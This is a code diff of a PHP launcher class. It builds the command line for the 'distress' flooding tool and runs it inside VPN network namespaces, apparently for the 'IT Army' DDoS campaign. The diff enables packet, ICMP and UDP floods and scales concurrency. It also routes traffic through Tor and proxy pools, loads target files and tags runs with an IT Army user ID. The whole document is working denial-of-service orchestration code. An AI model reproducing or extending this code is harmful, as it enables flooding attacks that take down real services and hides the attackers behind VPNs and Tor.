@@ -10,10 +10,10 @@ class DistressApplication extends distressApplicationStatic
     public function processLaunch()
     {
         global $DISTRESS_SCALE,
-               $DISTRESS_SCALE_MAX,
                $DISTRESS_PROXY_CONNECTIONS_PERCENT,
                $DISTRESS_USE_TOR,
-               $DISTRESS_USE_UDP_FLOOD;
+               $DISTRESS_USE_UDP_FLOOD,
+               $IT_ARMY_USER_ID;
 
         if ($this->launchFailed) {
             return -1;
@@ -25,41 +25,18 @@ class DistressApplication extends distressApplicationStatic
 
         // ---
 
-        $caUdpFlood = '';
+        $caScale = '';
         {
-            if ($DISTRESS_USE_UDP_FLOOD) {
-
-                $udpFloodSize = intRound($DISTRESS_SCALE / 3);
-
-                /*if ($DISTRESS_SCALE > 1000) {
-                    $scaleMultiplier = round($DISTRESS_SCALE / 1000, 1);
-                    $udpFloodSize *= $scaleMultiplier;
-                }*/
-
-                $directConnectionsMultiplier = intRound( (100 - intval($DISTRESS_PROXY_CONNECTIONS_PERCENT)) / 10 );
-                $udpFloodSize *= $directConnectionsMultiplier;
-
-                $maxUdpPacketSize = rand(1000, 1200);  // UDP 100% reliable size is 508 payload, 576 whole packet
-
-                $packetsPerConnection = intRound(ceil($udpFloodSize / $maxUdpPacketSize));
-                if ($packetsPerConnection < 1) {
-                    $packetsPerConnection = 1;
-                }
-
-                $udpPacketSize = intRound($udpFloodSize / $packetsPerConnection);
-
-                // ---
-
-                if ($udpPacketSize > 16) {
-                    $caUdpFlood = "--direct-udp-mixed-flood  --udp-packet-size=$udpPacketSize --direct-udp-mixed-flood-packets-per-conn=$packetsPerConnection";  //   --udp-flood-interval-ms=10
-                }
-            }
+            $currentVpnProviderMaxDistressScale = $this->vpnConnection->getOpenVpnConfig()->getProvider()->getSetting('maxDistressScale');
+            $scale = min($DISTRESS_SCALE, $currentVpnProviderMaxDistressScale);
+            $caScale = "--concurrency=$scale";
         }
+
 
         $caUseTor = '';
         {
             if ($DISTRESS_USE_TOR   &&  $DISTRESS_SCALE > 128) {
-                $torConnections = fitBetweenMinMax(1, 10, intRound($DISTRESS_SCALE / 1000));
+                $torConnections = fitBetweenMinMax(1, 50, intRound($DISTRESS_SCALE / 100));
                 $caUseTor = '--use-tor=' . $torConnections;
             }
         }
@@ -116,21 +93,54 @@ class DistressApplication extends distressApplicationStatic
             }
         }
 
+        $caSource = '--source=x100';
+        {
+            if ($IT_ARMY_USER_ID) {
+                $caSource .= '_' . $IT_ARMY_USER_ID;
+            }
+        }
+
+        $caPacketFlood = '';
+        {
+            $caPacketFlood = "--enable-packet-flood";
+        }
+
+        $caIcmpFlood = '';
+        {
+            $caIcmpFlood = "--enable-icmp-flood";
+        }
+
+        $caUdpFlood = '';
+        {
+            if ($DISTRESS_USE_UDP_FLOOD) {
+                $caUdpFlood = "--direct-udp-mixed-flood";
+                /*if ($proxyConnectionsPercentJoint < 50) {
+                    $packetsCount = 6 - floor($proxyConnectionsPercentJoint / 10);
+                    $caUdpFlood .= "  --direct-udp-mixed-flood-packets-per-conn=" . $packetsCount;
+                }*/
+            }
+        }
+
         $caInterface = '--interface=' . $this->vpnConnection->netInterface;
 
         // ---
 
         $command =    'setsid   ip netns exec ' . $this->vpnConnection->getNetnsName()
-                 . "   nice -n 10   /sbin/runuser -p -u app-h -g app-h   --"
-                 . '   ' . static::$distressCliPath . "  --concurrency=$DISTRESS_SCALE"
-                 . "  --disable-auto-update  --log-interval-sec=15  --worker-threads=1  --json-logs  --source=x100"  // --user-id=0
-                 . "  $caUseMyIp"
+                 . "   nice -n 10"
+                 //. "   /sbin/runuser -p -u app-h -g app-h   --"
+                 . "  " . static::$distressCliPath
+                 . "  --disable-auto-update  --log-interval-sec=15  --worker-threads=1  --json-logs"
+                 . "  $caScale"
+                 . "  $caPacketFlood"
+                 . "  $caIcmpFlood"
                  . "  $caUdpFlood"
+                 . "  $caUseMyIp"
                  . "  $caUseTor"
                  . "  $caProxyPool"
                  . "  $caConfig"
                  . "  $caLocalTargetsFile"
                  . "  $caInterface"
+                 . "  $caSource"
                  . "  2>&1";
 
         $this->log('Launching Distress on VPN' . $this->vpnConnection->getIndex());
